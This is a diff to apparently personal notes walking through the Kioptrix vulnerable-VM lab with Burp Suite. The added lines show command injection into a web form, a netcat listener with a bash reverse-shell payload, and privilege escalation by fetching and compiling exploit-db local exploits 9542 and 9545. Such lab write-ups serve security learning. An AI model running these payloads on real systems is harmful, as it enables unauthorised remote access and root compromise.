@@ -35,7 +35,7 @@ Start Firefox and goto http://burp > CA Cert (Download)
 
 Turn Off Intercept in Burp under Proxy Tab
 
-## Start Attacking using Burp Suite
+### Start Attacking using Burp Suite
 
 Open http://<kioprix ip> in a browser
 
@@ -58,13 +58,53 @@ Click "Start Attack"
 Sort by length of the output
 779 length gives a different response than 860
 
-Select a request, right click > Request IN browser > In Original Session > Copy
+Select a request, right click > Request In Browser > In Original Session > Copy
 
 Kill the intruder attack
 
 Turn off intercept on proxy tab.
 
 Cut and Paste url from burp into Firefox
+
+Test the input box for command chaining...it works!
+127.0.0.1; ifconfig 
+
+Start a listener...
+nc -nlvp 4444
+
+Enter this into website
+127.0.0.1; bash -i >& /dev/tcp/192.168.56.101/4444 0>&1
+
+##Privledge Escation
+
+Geting the system info...
+lsb_release -a
+uname -a
+
+Based off the OS and Kernel, a few vulns were found (Google and searchsploit): 9542 & 9545
+
+Need to get the code onto target...
+
+service apache2 start
+cp /usr/share/exploitdb/exploits/linux_x86/local/9542.c /var/www/html/
+
+Pull and compile...first failed...second worked!
+
+wget http://192.168.56.103/9542.c
+gcc 9542.c -o 9542
+chmod +x 9542
+./9542
+
+wget http://192.168.56.103/9545.c
+gcc 9545.c -o 9545
+chmod +x 9545
+./9545
+
+
+
+
+
+
 
 
 
